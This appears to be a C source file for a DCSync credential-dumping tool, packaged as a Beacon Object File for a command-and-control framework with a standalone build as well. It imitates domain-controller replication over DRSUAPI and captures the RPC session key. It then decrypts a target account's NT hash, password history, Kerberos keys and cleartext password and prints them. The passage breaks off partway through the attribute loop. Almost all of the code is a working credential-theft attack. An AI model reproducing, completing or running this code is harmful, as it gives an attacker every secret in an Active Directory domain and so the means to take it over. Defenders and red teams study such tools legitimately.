
#include <windows.h>
#include <wincrypt.h>
#include <msasn1.h>
#include "base.c"

#ifdef WOW64
#include "ms-drsr_c_x86.c"
#else
#include "ms-drsr_c_x64.c"
#endif

#include "drsr_defs.h"

#ifndef BOF
#undef internal_printf
#define internal_printf(...) do { printf( __VA_ARGS__ ); fflush( stdout ); } while ( 0 )
#endif

#ifdef BOF
#define verbose_printf(...) do { } while ( 0 )
#define SECRET_PREFIX ""
#else
#define verbose_printf(...) internal_printf( __VA_ARGS__ )
#define SECRET_PREFIX "          "
#endif

/*  Security context structures for session key extraction  */
typedef struct _SecHandle {
    ULONG_PTR dwLower;
    ULONG_PTR dwUpper;
} SecHandle, *PSecHandle;

typedef SecHandle CtxtHandle;
typedef PSecHandle PCtxtHandle;

typedef struct _SecPkgContext_SessionKey {
    ULONG SessionKeyLength;
    PBYTE SessionKey;
} SecPkgContext_SessionKey, *PSecPkgContext_SessionKey;

#ifndef SEC_E_OK
#define SEC_E_OK ((HRESULT)0x00000000L)
#endif
#define SECPKG_ATTR_SESSION_KEY 9
#define RPC_C_OPT_SECURITY_CALLBACK 10

#ifndef BOF
typedef LONG SECURITY_STATUS;
__declspec(dllimport) SECURITY_STATUS __stdcall QueryContextAttributesW(PCtxtHandle phContext, unsigned long ulAttribute, void *pBuffer);
__declspec(dllimport) SECURITY_STATUS __stdcall FreeContextBuffer(void *pvContextBuffer);
#else
/*  For BOF builds, we need to declare these SSPI functions  */
typedef LONG SECURITY_STATUS;
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$QueryContextAttributesW(PCtxtHandle phContext, unsigned long ulAttribute, void *pBuffer);
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$FreeContextBuffer(void *pvContextBuffer);
#define QueryContextAttributesW SECUR32$QueryContextAttributesW
#define FreeContextBuffer SECUR32$FreeContextBuffer
#endif

#define BUF_SIZE 512

/*  Global session key storage  */
static BYTE* g_pSessionKey = NULL;
static DWORD g_dwSessionKeyLen = 0;

EXTERN_C void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
	return(MSVCRT$malloc(len));
}

EXTERN_C void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
	MSVCRT$free(ptr);
}

/*  RPC security callback to extract session key  */
void RPC_ENTRY RpcSecurityCallback( void* context )
{
    RPC_STATUS rpcStatus;
    SECURITY_STATUS secStatus;
    PCtxtHandle pSecurityContext = NULL;
    SecPkgContext_SessionKey sessionKeyInfo = { 0 };

    /*  Only extract once  */
    if ( g_pSessionKey != NULL )
    {
        return;
    }

    /*  Get the security context from the RPC binding  */
    rpcStatus = RPCRT4$I_RpcBindingInqSecurityContext( context, (void**)&pSecurityContext );
    if ( rpcStatus != RPC_S_OK || pSecurityContext == NULL )
    {
        internal_printf( "[!] RpcSecurityCallback: I_RpcBindingInqSecurityContext failed: 0x%x\n", rpcStatus );
        return;
    }

    /*  Query the session key from the security context  */
    secStatus = QueryContextAttributesW( pSecurityContext, SECPKG_ATTR_SESSION_KEY, &sessionKeyInfo );
    if ( secStatus != SEC_E_OK )
    {
        internal_printf( "[!] RpcSecurityCallback: QueryContextAttributesW failed: 0x%x\n", secStatus );
        return;
    }

    if ( sessionKeyInfo.SessionKeyLength == 0 || sessionKeyInfo.SessionKey == NULL )
    {
        internal_printf( "[!] RpcSecurityCallback: Session key is empty\n" );
        return;
    }

    /*  Allocate and copy the session key  */
    g_pSessionKey = (BYTE*)intAlloc( sessionKeyInfo.SessionKeyLength );
    if ( !g_pSessionKey )
    {
        FreeContextBuffer( sessionKeyInfo.SessionKey );
        return;
    }

    MSVCRT$memcpy( g_pSessionKey, sessionKeyInfo.SessionKey, sessionKeyInfo.SessionKeyLength );
    g_dwSessionKeyLen = sessionKeyInfo.SessionKeyLength;

    /*  Free the session key buffer allocated by SSPI  */
    FreeContextBuffer( sessionKeyInfo.SessionKey );

    verbose_printf( "[*] RpcSecurityCallback: Session key extracted (%u bytes)\n", g_dwSessionKeyLen );
}

// modified from
// https://github.com/outflanknl/C2-Tool-Collection/blob/8b7a73b5b40bf13e905fd69eb0573a88fa81e892/BOF/PetitPotam/SOURCE/PetitPotam.c#L223
RPC_STATUS CreateBindingHandle(_In_ LPWSTR lpwTarget, _Out_ RPC_BINDING_HANDLE* binding_handle) {
	RPC_STATUS rStatus;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = { 0 };
	RPC_WSTR StringBinding = NULL;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;

	rStatus = RPCRT4$RpcStringBindingComposeW((RPC_WSTR)L"e3514235-4b06-11d1-ab04-00c04fc2dcd2", (RPC_WSTR)L"ncacn_ip_tcp", (RPC_WSTR)lpwTarget, (RPC_WSTR)NULL, (RPC_WSTR)NULL, &StringBinding);
	if (rStatus == RPC_S_OK) {
		rStatus = RPCRT4$RpcBindingFromStringBindingW(StringBinding, &Binding);
		if (!rStatus) {
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			rStatus = RPCRT4$RpcBindingSetAuthInfoExW(Binding, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (rStatus == RPC_S_OK) {
				/*  Register security callback to extract session key  */
				rStatus = RPCRT4$RpcBindingSetOption( Binding, RPC_C_OPT_SECURITY_CALLBACK, (ULONG_PTR)RpcSecurityCallback );
				if ( rStatus != RPC_S_OK ) {
					internal_printf( "[!] RpcBindingSetOption failed: 0x%x\n", rStatus );
				}

				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				internal_printf("[>] RPC Binding successful\n");
			}
		}
	}
	if (Binding) {
		RPCRT4$RpcBindingFree(&Binding);
	}

	if (StringBinding) {
		RPCRT4$RpcStringFreeW(&StringBinding);
	}

	return rStatus;
}

/*  Helper function to create a DSNAME structure from a DN string  */
DSNAME* CreateDsName( LPWSTR dn )
{
    SIZE_T dnLen = MSVCRT$wcslen( dn );
    SIZE_T dsNameSize = sizeof( DSNAME ) + ( dnLen * sizeof( WCHAR ) );

    DSNAME* pDsName = (DSNAME*)intAlloc( dsNameSize );
    if ( pDsName == NULL )
    {
        return NULL;
    }

    pDsName->structLen = (DWORD)dsNameSize;
    pDsName->SidLen = 0;
    pDsName->NameLen = (DWORD)dnLen;
    MSVCRT$memcpy( pDsName->StringName, dn, dnLen * sizeof( WCHAR ) );

    return pDsName;
}

#ifndef BOF
/*  CRYPTO_BUFFER for non-BOF builds  */
typedef struct _CRYPTO_BUFFER
{
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} CRYPTO_BUFFER, *PCRYPTO_BUFFER;
#endif

void PrintHexBytes( BYTE* pBytes, DWORD dwLen )
{
    for ( DWORD i = 0; i < dwLen; i++ )
    {
        internal_printf( "%02x", pBytes[i] );
    }
}

void TransformDESKey( BYTE* pInputKey, BYTE* pOutputKey )
{
    pOutputKey[0] = ( pInputKey[0] >> 1 );
    pOutputKey[1] = ( ( pInputKey[0] & 0x01 ) << 6 ) | ( pInputKey[1] >> 2 );
    pOutputKey[2] = ( ( pInputKey[1] & 0x03 ) << 5 ) | ( pInputKey[2] >> 3 );
    pOutputKey[3] = ( ( pInputKey[2] & 0x07 ) << 4 ) | ( pInputKey[3] >> 4 );
    pOutputKey[4] = ( ( pInputKey[3] & 0x0f ) << 3 ) | ( pInputKey[4] >> 5 );
    pOutputKey[5] = ( ( pInputKey[4] & 0x1f ) << 2 ) | ( pInputKey[5] >> 6 );
    pOutputKey[6] = ( ( pInputKey[5] & 0x3f ) << 1 ) | ( pInputKey[6] >> 7 );
    pOutputKey[7] = ( pInputKey[6] & 0x7f );

    for ( DWORD i = 0; i < 8; i++ )
    {
        pOutputKey[i] = ( pOutputKey[i] << 1 ) & 0xfe;
    }
}

void DeriveRidDESKeys( DWORD dwRid, BYTE key1[8], BYTE key2[8] )
{
    BYTE ridBytes[4];
    BYTE rawKey1[7];
    BYTE rawKey2[7];

    ridBytes[0] = (BYTE)( dwRid & 0xff );
    ridBytes[1] = (BYTE)( ( dwRid >> 8 ) & 0xff );
    ridBytes[2] = (BYTE)( ( dwRid >> 16 ) & 0xff );
    ridBytes[3] = (BYTE)( ( dwRid >> 24 ) & 0xff );

    rawKey1[0] = ridBytes[0];
    rawKey1[1] = ridBytes[1];
    rawKey1[2] = ridBytes[2];
    rawKey1[3] = ridBytes[3];
    rawKey1[4] = ridBytes[0];
    rawKey1[5] = ridBytes[1];
    rawKey1[6] = ridBytes[2];

    rawKey2[0] = ridBytes[3];
    rawKey2[1] = ridBytes[0];
    rawKey2[2] = ridBytes[1];
    rawKey2[3] = ridBytes[2];
    rawKey2[4] = ridBytes[3];
    rawKey2[5] = ridBytes[0];
    rawKey2[6] = ridBytes[1];

    TransformDESKey( rawKey1, key1 );
    TransformDESKey( rawKey2, key2 );
}

BOOL DecryptDESBlock( HCRYPTPROV hProv, BYTE key[8], BYTE encryptedBlock[8], BYTE decryptedBlock[8] )
{
    struct
    {
        BLOBHEADER header;
        DWORD dwKeySize;
        BYTE keyBytes[8];
    } keyBlob;
    HCRYPTKEY hKey = 0;
    DWORD dwMode = CRYPT_MODE_ECB;
    DWORD dwBlockLen = 8;
    BOOL result = FALSE;

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_DES;
    keyBlob.dwKeySize = 8;
    MSVCRT$memcpy( keyBlob.keyBytes, key, 8 );
    MSVCRT$memcpy( decryptedBlock, encryptedBlock, 8 );

    if ( !ADVAPI32$CryptImportKey( hProv, (BYTE*)&keyBlob, sizeof( keyBlob ), 0, 0, &hKey ) )
    {
        goto END;
    }

    ADVAPI32$CryptSetKeyParam( hKey, KP_MODE, (BYTE*)&dwMode, 0 );

    if ( !ADVAPI32$CryptDecrypt( hKey, 0, FALSE, 0, decryptedBlock, &dwBlockLen ) || dwBlockLen != 8 )
    {
        goto END;
    }

    result = TRUE;

END:
    if ( hKey )
    {
        ADVAPI32$CryptDestroyKey( hKey );
    }
    return result;
}

BOOL RemoveRidDESLayer( BYTE* pEncryptedHash, DWORD dwEncryptedHashLen, DWORD dwRid, BYTE* pDecryptedHash )
{
    HCRYPTPROV hProv = 0;
    BYTE key1[8];
    BYTE key2[8];
    BOOL result = FALSE;

    if ( pEncryptedHash == NULL || pDecryptedHash == NULL || dwEncryptedHashLen < 16 )
    {
        return FALSE;
    }

    if ( !ADVAPI32$CryptAcquireContextW( &hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
    {
        return FALSE;
    }

    DeriveRidDESKeys( dwRid, key1, key2 );

    if ( !DecryptDESBlock( hProv, key1, pEncryptedHash, pDecryptedHash ) )
    {
        goto END;
    }

    if ( !DecryptDESBlock( hProv, key2, pEncryptedHash + 8, pDecryptedHash + 8 ) )
    {
        goto END;
    }

    result = TRUE;

END:
    ADVAPI32$CryptReleaseContext( hProv, 0 );
    return result;
}

void PrintRidHashList( const char* label, BYTE* pData, DWORD dwDataLen, DWORD dwRid )
{
    BYTE hash[16];
    DWORD count = dwDataLen / 16;

    if ( dwRid == 0 )
    {
        internal_printf( SECRET_PREFIX "[!] %s cannot be unwrapped without RID\n", label );
        return;
    }

    if ( count == 0 )
    {
        internal_printf( SECRET_PREFIX "[!] %s decrypted payload is too short (%u bytes)\n", label, dwDataLen );
        return;
    }

    for ( DWORD i = 0; i < count; i++ )
    {
        if ( RemoveRidDESLayer( pData + ( i * 16 ), 16, dwRid, hash ) )
        {
            if ( count == 1 )
            {
                internal_printf( SECRET_PREFIX "[*] %s: ", label );
            }
            else
            {
                internal_printf( SECRET_PREFIX "[*] %s[%u]: ", label, i );
            }
            PrintHexBytes( hash, 16 );
            internal_printf( "\n" );
        }
        else
        {
            internal_printf( SECRET_PREFIX "[!] %s[%u] RID DES unwrap failed\n", label, i );
        }
    }
}

WORD ReadLe16( BYTE* p )
{
    return (WORD)( p[0] | ( p[1] << 8 ) );
}

DWORD ReadLe32( BYTE* p )
{
    return (DWORD)( p[0] | ( p[1] << 8 ) | ( p[2] << 16 ) | ( p[3] << 24 ) );
}

int HexNibble( BYTE c )
{
    if ( c >= '0' && c <= '9' )
    {
        return c - '0';
    }
    if ( c >= 'a' && c <= 'f' )
    {
        return c - 'a' + 10;
    }
    if ( c >= 'A' && c <= 'F' )
    {
        return c - 'A' + 10;
    }
    return -1;
}

BYTE* HexDecodeAlloc( BYTE* pHex, DWORD dwHexLen, DWORD* pdwOutLen )
{
    BYTE* pOut;
    DWORD outLen;

    if ( pHex == NULL || pdwOutLen == NULL || ( dwHexLen % 2 ) != 0 )
    {
        return NULL;
    }

    outLen = dwHexLen / 2;
    pOut = (BYTE*)intAlloc( outLen );
    if ( pOut == NULL )
    {
        return NULL;
    }

    for ( DWORD i = 0; i < outLen; i++ )
    {
        int hi = HexNibble( pHex[i * 2] );
        int lo = HexNibble( pHex[( i * 2 ) + 1] );
        if ( hi < 0 || lo < 0 )
        {
            intFree( pOut );
            return NULL;
        }
        pOut[i] = (BYTE)( ( hi << 4 ) | lo );
    }

    *pdwOutLen = outLen;
    return pOut;
}

BOOL SupplementalNameEquals( BYTE* pName, WORD wNameLen, const char* asciiName )
{
    DWORD charCount = wNameLen / sizeof( WCHAR );
    DWORD asciiLen = (DWORD)MSVCRT$strlen( asciiName );

    if ( charCount > 0 && pName[( charCount - 1 ) * sizeof( WCHAR )] == 0 &&
         pName[( ( charCount - 1 ) * sizeof( WCHAR ) ) + 1] == 0 )
    {
        charCount--;
    }

    if ( charCount != asciiLen )
    {
        return FALSE;
    }

    for ( DWORD i = 0; i < asciiLen; i++ )
    {
        if ( pName[i * sizeof( WCHAR )] != (BYTE)asciiName[i] ||
             pName[( i * sizeof( WCHAR ) ) + 1] != 0 )
        {
            return FALSE;
        }
    }

    return TRUE;
}

const char* KerbKeyTypeName( DWORD keyType )
{
    switch ( keyType )
    {
        case 3:
            return "des_cbc_md5";
        case 17:
            return "aes128_hmac";
        case 18:
            return "aes256_hmac";
        case 23:
            return "rc4_hmac";
        default:
            return "unknown";
    }
}

void ParseKerberosNewerKeys( BYTE* pHexValue, DWORD dwHexValueLen )
{
    DWORD dwBlobLen = 0;
    BYTE* pBlob = HexDecodeAlloc( pHexValue, dwHexValueLen, &dwBlobLen );
    WORD credentialCount;
    WORD saltLen;
    DWORD saltOffset;
    DWORD defaultIterations;
    DWORD keyDataOffset = 24;

    if ( pBlob == NULL )
    {
        internal_printf( SECRET_PREFIX "[!] Kerberos-Newer-Keys hex decode failed\n" );
        return;
    }

    if ( dwBlobLen < 24 )
    {
        internal_printf( SECRET_PREFIX "[!] Kerberos-Newer-Keys blob too short (%u bytes)\n", dwBlobLen );
        intFree( pBlob );
        return;
    }

    credentialCount = ReadLe16( pBlob + 4 );
    saltLen = ReadLe16( pBlob + 12 );
    saltOffset = ReadLe32( pBlob + 16 );
    defaultIterations = ReadLe32( pBlob + 20 );

    if ( saltLen > 0 && saltOffset + saltLen <= dwBlobLen )
    {
        internal_printf( SECRET_PREFIX "[*] Kerberos Salt: %.*S\n", saltLen / sizeof( WCHAR ), (WCHAR*)( pBlob + saltOffset ) );
    }
    if ( defaultIterations != 0 )
    {
        internal_printf( SECRET_PREFIX "[*] Kerberos Iterations: %u\n", defaultIterations );
    }

    for ( WORD i = 0; i < credentialCount; i++ )
    {
        BYTE* pKeyData = pBlob + keyDataOffset + ( i * 24 );
        DWORD iterationCount;
        DWORD keyType;
        DWORD keyLen;
        DWORD keyOffset;

        if ( keyDataOffset + ( ( i + 1 ) * 24 ) > dwBlobLen )
        {
            break;
        }

        iterationCount = ReadLe32( pKeyData + 8 );
        keyType = ReadLe32( pKeyData + 12 );
        keyLen = ReadLe32( pKeyData + 16 );
        keyOffset = ReadLe32( pKeyData + 20 );

        if ( keyLen > 0 && keyOffset + keyLen <= dwBlobLen )
        {
            internal_printf( SECRET_PREFIX "[*] Kerberos %s", KerbKeyTypeName( keyType ) );
            if ( iterationCount != 0 )
            {
                internal_printf( " (%u)", iterationCount );
            }
            internal_printf( ": " );
            PrintHexBytes( pBlob + keyOffset, keyLen );
            internal_printf( "\n" );
        }
    }

    intFree( pBlob );
}

void ParseSupplementalCredentials( BYTE* pData, DWORD dwDataLen )
{
    DWORD propertiesEnd;
    DWORD offset;
    WORD propertyCount;

    if ( pData == NULL || dwDataLen < 113 )
    {
        internal_printf( SECRET_PREFIX "[!] Supplemental credentials blob too short (%u bytes)\n", dwDataLen );
        return;
    }

    propertiesEnd = 12 + ReadLe32( pData + 4 );
    if ( propertiesEnd > dwDataLen || propertiesEnd < 112 )
    {
        internal_printf( SECRET_PREFIX "[!] Supplemental credentials length is invalid\n" );
        return;
    }

    propertyCount = ReadLe16( pData + 110 );
    offset = 112;

    verbose_printf( "          [*] Supplemental Properties: %u\n", propertyCount );

    for ( WORD i = 0; i < propertyCount && offset + 6 <= propertiesEnd; i++ )
    {
        WORD nameLen = ReadLe16( pData + offset );
        WORD valueLen = ReadLe16( pData + offset + 2 );
        BYTE* pName = pData + offset + 6;
        BYTE* pValue = pName + nameLen;

        if ( offset + 6 + nameLen + valueLen > propertiesEnd )
        {
            internal_printf( SECRET_PREFIX "[!] Supplemental property %u is truncated\n", i );
            break;
        }

        verbose_printf( "          [*] Supplemental Property: %.*S\n", nameLen / sizeof( WCHAR ), (WCHAR*)pName );

        if ( SupplementalNameEquals( pName, nameLen, "Primary:Kerberos-Newer-Keys" ) )
        {
            ParseKerberosNewerKeys( pValue, valueLen );
        }
#ifndef BOF
        else if ( SupplementalNameEquals( pName, nameLen, "Primary:CLEARTEXT" ) )
        {
            DWORD clearLen = 0;
            BYTE* pClear = HexDecodeAlloc( pValue, valueLen, &clearLen );
            if ( pClear != NULL )
            {
                internal_printf( "          [*] Cleartext: %.*S\n", clearLen / sizeof( WCHAR ), (WCHAR*)pClear );
                intFree( pClear );
            }
        }
#endif

        offset += 6 + nameLen + valueLen;
    }
}

BOOL IsInterestingAttr( ATTRTYP attrTyp )
{
#ifdef BOF
    return attrTyp == ATT_UNICODE_PWD ||
           attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
           attrTyp == 0x00090092;
#else
    return attrTyp == ATT_SAM_ACCOUNT_NAME ||
           attrTyp == ATT_USER_PRINCIPAL_NAME ||
           attrTyp == ATT_DBCS_PWD ||
           attrTyp == ATT_UNICODE_PWD ||
           attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
           attrTyp == ATT_NT_PWD_HISTORY ||
           attrTyp == ATT_LM_PWD_HISTORY ||
           attrTyp == 0x00090092;
#endif
}

BOOL ShouldDecryptAttr( ATTRTYP attrTyp )
{
#ifdef BOF
    return attrTyp == ATT_UNICODE_PWD ||
           attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS;
#else
    return attrTyp == ATT_DBCS_PWD ||
           attrTyp == ATT_UNICODE_PWD ||
           attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
           attrTyp == ATT_NT_PWD_HISTORY ||
           attrTyp == ATT_LM_PWD_HISTORY;
#endif
}

/*  Helper function to decrypt DRS secret attributes using session key + RC4.  */
BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, BYTE* pEncryptedBlob, DWORD dwBlobLen, BYTE** ppDecryptedData, DWORD* pdwDecryptedLen )
{
    if ( pSessionKey == NULL || dwSessionKeyLen == 0 || pEncryptedBlob == NULL ||
         ppDecryptedData == NULL || pdwDecryptedLen == NULL || dwBlobLen <= 20 )
    {
        return FALSE;
    }

    *ppDecryptedData = NULL;
    *pdwDecryptedLen = 0;

    BYTE* pSalt = pEncryptedBlob;
    DWORD dwCipherLen = dwBlobLen - 16;
    DWORD dwPlainLen = dwCipherLen - 4;

    /*  Derive MD5 hash of (SessionKey + Salt)  */
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE md5Hash[16];
    DWORD md5Len = 16;

    if ( !ADVAPI32$CryptAcquireContextW( &hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
    {
        return FALSE;
    }

    if ( !ADVAPI32$CryptCreateHash( hProv, CALG_MD5, 0, 0, &hHash ) )
    {
        ADVAPI32$CryptReleaseContext( hProv, 0 );
        return FALSE;
    }

    /*  Hash session key  */
    if ( !ADVAPI32$CryptHashData( hHash, pSessionKey, dwSessionKeyLen, 0 ) )
    {
        ADVAPI32$CryptDestroyHash( hHash );
        ADVAPI32$CryptReleaseContext( hProv, 0 );
        return FALSE;
    }

    /*  Hash salt  */
    if ( !ADVAPI32$CryptHashData( hHash, pSalt, 16, 0 ) )
    {
        ADVAPI32$CryptDestroyHash( hHash );
        ADVAPI32$CryptReleaseContext( hProv, 0 );
        return FALSE;
    }

    /*  Get the hash value  */
    if ( !ADVAPI32$CryptGetHashParam( hHash, HP_HASHVAL, md5Hash, &md5Len, 0 ) )
    {
        ADVAPI32$CryptDestroyHash( hHash );
        ADVAPI32$CryptReleaseContext( hProv, 0 );
        return FALSE;
    }

    ADVAPI32$CryptDestroyHash( hHash );
    ADVAPI32$CryptReleaseContext( hProv, 0 );

    BYTE* pCipher = (BYTE*)intAlloc( dwCipherLen );
    BYTE* pDecrypted = (BYTE*)intAlloc( dwPlainLen );
    if ( !pCipher || !pDecrypted )
    {
        if ( pCipher )
        {
            intFree( pCipher );
        }
        if ( pDecrypted )
        {
            intFree( pDecrypted );
        }
        return FALSE;
    }

    /*  The encrypted range is Checksum || Data; Salt is the only cleartext field.  */
    MSVCRT$memcpy( pCipher, pEncryptedBlob + 16, dwCipherLen );

    /*  Decrypt using RC4 (SystemFunction032)  */
    CRYPTO_BUFFER dataBuffer;
    CRYPTO_BUFFER keyBuffer;

    dataBuffer.Length = dwCipherLen;
    dataBuffer.MaximumLength = dwCipherLen;
    dataBuffer.Buffer = pCipher;

    keyBuffer.Length = 16;
    keyBuffer.MaximumLength = 16;
    keyBuffer.Buffer = md5Hash;

#ifndef BOF
    typedef NTSTATUS (WINAPI *SystemFunction032_t)(PCRYPTO_BUFFER, PCRYPTO_BUFFER);
    HMODULE hAdvapi = LoadLibraryA( "advapi32.dll" );
    if ( !hAdvapi )
    {
        intFree( pCipher );
        intFree( pDecrypted );
        return FALSE;
    }

    SystemFunction032_t pSystemFunction032 = (SystemFunction032_t)GetProcAddress( hAdvapi, "SystemFunction032" );
    if ( !pSystemFunction032 )
    {
        FreeLibrary( hAdvapi );
        intFree( pCipher );
        intFree( pDecrypted );
        return FALSE;
    }

    NTSTATUS status = pSystemFunction032( &dataBuffer, &keyBuffer );
    FreeLibrary( hAdvapi );
#else
    NTSTATUS status = ADVAPI32$SystemFunction032( &dataBuffer, &keyBuffer );
#endif

    if ( status != 0 )
    {
        intFree( pCipher );
        intFree( pDecrypted );
        return FALSE;
    }

    /*  The first decrypted DWORD is the DRS checksum.  */
    MSVCRT$memcpy( pDecrypted, pCipher + 4, dwPlainLen );
    intFree( pCipher );

    *ppDecryptedData = pDecrypted;
    *pdwDecryptedLen = dwPlainLen;

    return TRUE;
}

void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
{
#ifdef BOF
    internal_printf( "[*] Target: %S\n", userDN );
    internal_printf( "[*] DC: %S\n", domainController );
#else
    internal_printf( "[*] Target user DN: %S\n", userDN );
    internal_printf( "[*] Domain DN     : %S\n", domainDN );
    internal_printf( "[*] Target DC     : %S\n", domainController );
#endif

    RPC_BINDING_HANDLE bHandle = NULL;
	RPC_STATUS rStatus = RPC_S_NO_BINDINGS;

    rStatus = CreateBindingHandle( domainController, &bHandle );
	if ( rStatus != RPC_S_OK )
    {
		internal_printf( "[!] RPC Binding failed...\n" );
		goto END;
	}
    
    ULONG drsStatus;
    DRS_MSG_GETCHGREQ getChReq = { 0 };
    DRS_EXTENSIONS* pDrsExtensionsOutput = NULL;
    DRS_HANDLE drsHandle = NULL;
    DSNAME* pUserDsName = NULL;

    /*  Allocate and setup DRS extensions  */
    DRS_EXTENSIONS_INT* pDrsExtensionsInt = (DRS_EXTENSIONS_INT*)intAlloc( sizeof( DRS_EXTENSIONS_INT ) );
    if ( pDrsExtensionsInt == NULL )
    {
        internal_printf( "[!] Failed to allocate memory for DRS extensions\n" );
        goto END;
    }

    pDrsExtensionsInt->cb = sizeof( DRS_EXTENSIONS_INT ) - sizeof( DWORD );
    pDrsExtensionsInt->dwFlags = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 |
        DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_NONDOMAIN_NCS;

    verbose_printf( "[*] Calling IDL_DRSBind...\n" );


    drsStatus = IDL_DRSBind( bHandle, NULL, (DRS_EXTENSIONS*)pDrsExtensionsInt, &pDrsExtensionsOutput, &drsHandle );
    if ( drsStatus == 0 )
    {
        internal_printf( "[>] IDL_DRSBind success\n" );

        /*  Check server extensions  */
        if ( pDrsExtensionsOutput != NULL && pDrsExtensionsOutput->cb >= sizeof( DWORD ) )
        {
            DRS_EXTENSIONS_INT* pServerExt = (DRS_EXTENSIONS_INT*)pDrsExtensionsOutput;
            verbose_printf( "[*] Server extensions cb: %u\n", pServerExt->cb );
            verbose_printf( "[*] Server flags: 0x%08x\n", pServerExt->dwFlags );

            /*  Check if server supports required capabilities  */
            if ( !( pServerExt->dwFlags & DRS_EXT_GETCHGREQ_V8 ) )
            {
                internal_printf( "[!] Server does not support GETCHGREQ_V8\n" );
                goto END;
            }
            verbose_printf( "[>] Server supports GETCHGREQ_V8\n" );

            if ( pServerExt->dwFlags & DRS_EXT_STRONG_ENCRYPTION )
            {
                verbose_printf( "[>] Server supports strong encryption\n" );
            }

            /*  Copy server extension info to request structure  */
            if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, SiteObjGuid ) + sizeof( GUID ) )
            {
                MSVCRT$memcpy( &getChReq.V8.uuidDsaObjDest, &pServerExt->SiteObjGuid, sizeof( GUID ) );
                verbose_printf( "[*] Copied SiteObjGuid to request\n" );
            }

            if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, ConfigObjGUID ) + sizeof( GUID ) )
            {
                MSVCRT$memcpy( &getChReq.V8.uuidInvocIdSrc, &pServerExt->ConfigObjGUID, sizeof( GUID ) );
                verbose_printf( "[*] Copied ConfigObjGUID to request\n" );
            }

            /*  Copy additional extension fields  */
            if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, dwReplEpoch ) + sizeof( DWORD ) )
            {
                pDrsExtensionsInt->dwReplEpoch = pServerExt->dwReplEpoch;
                verbose_printf( "[*] Copied dwReplEpoch: %u\n", pServerExt->dwReplEpoch );
            }

            if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, dwExtCaps ) + sizeof( DWORD ) )
            {
                pDrsExtensionsInt->dwExtCaps = pServerExt->dwExtCaps;
                verbose_printf( "[*] Copied dwExtCaps: 0x%08x\n", pServerExt->dwExtCaps );
            }

            /*  Create DSNAME for user  */
            pUserDsName = CreateDsName( userDN );
            if ( pUserDsName == NULL )
            {
                internal_printf( "[!] Failed to create user DSNAME\n" );
                goto END;
            }

            /*  Setup GetNCChanges request  */
            /*  Request all attributes for this one object; the partial set caused
                supplementalCredentials to be omitted on Server 2019 in GOAD.  */
            getChReq.V8.pNC = pUserDsName;
            getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP;
            getChReq.V8.cMaxObjects = 1;
            getChReq.V8.cMaxBytes = 0;
            getChReq.V8.ulExtendedOp = EXOP_REPL_OBJ;
            getChReq.V8.pPartialAttrSet = NULL;

            /*  Verify session key was extracted by the security callback  */
            if ( g_pSessionKey == NULL || g_dwSessionKeyLen == 0 )
            {
                internal_printf( "[!] Session key was not extracted by security callback\n" );
                goto END;
            }
            verbose_printf( "[*] Session key available: %u bytes\n", g_dwSessionKeyLen );

            verbose_printf( "[*] Calling IDL_DRSGetNCChanges...\n" );

            DWORD dwOutVersion = 0;
            DRS_MSG_GETCHGREPLY getChReply = { 0 };

            drsStatus = IDL_DRSGetNCChanges( drsHandle, 8, &getChReq, &dwOutVersion, &getChReply );
            if ( drsStatus == 0 )
            {
                internal_printf( "[>] IDL_DRSGetNCChanges success\n" );
                verbose_printf( "[*] Reply version: %u\n", dwOutVersion );

                if ( dwOutVersion == 6 || dwOutVersion == 1 )
                {
                    /*  V6 and V1 have the same pObjects structure  */
                    DRS_MSG_GETCHGREPLY_V6* pReply = &getChReply.V6;

                    verbose_printf( "[*] Number of objects: %u\n", pReply->cNumObjects );
                    verbose_printf( "[*] Number of bytes: %u\n", pReply->cNumBytes );
                    verbose_printf( "[*] More data available: %s\n", pReply->fMoreData ? "Yes" : "No" );

                    if ( pReply->pObjects != NULL )
                    {
                        REPLENTINFLIST* pCurrent = pReply->pObjects;
                        ULONG objIndex = 0;

                        while ( pCurrent != NULL )
                        {
                            verbose_printf( "\n[*] Object %u:\n", objIndex );

                            /*  Print object DN  */
                            if ( pCurrent->Entinf.pName != NULL && pCurrent->Entinf.pName->NameLen > 0 )
                            {
                                verbose_printf( "    DN: %.*S\n", pCurrent->Entinf.pName->NameLen, pCurrent->Entinf.pName->StringName );
                            }

                            /*  Iterate through attributes  */
